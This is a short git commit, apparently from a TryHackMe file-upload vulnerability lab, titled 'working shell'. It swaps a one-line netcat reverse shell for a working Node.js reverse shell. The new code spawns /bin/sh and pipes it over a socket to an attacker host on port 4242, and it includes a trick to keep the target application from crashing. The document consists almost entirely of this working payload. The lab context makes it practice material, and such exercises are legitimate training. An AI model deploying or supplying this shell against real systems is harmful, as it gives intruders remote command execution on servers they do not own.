573105c426aeae40ea7e48d63dd77a57acbb85d7
root <root@ip-10-10-176-29.eu-west-1.compute.internal>
2022-03-29 23:58:37 +0100

    working shell

--- THM/Uploadvulns/shell.js
+++ THM/Uploadvulns/shell.js
@@ -1,1 +1,12 @@
-require('child_process').exec('nc -e /bin/sh 10.10.176.106 4242')
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4242, "10.10.176.29", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
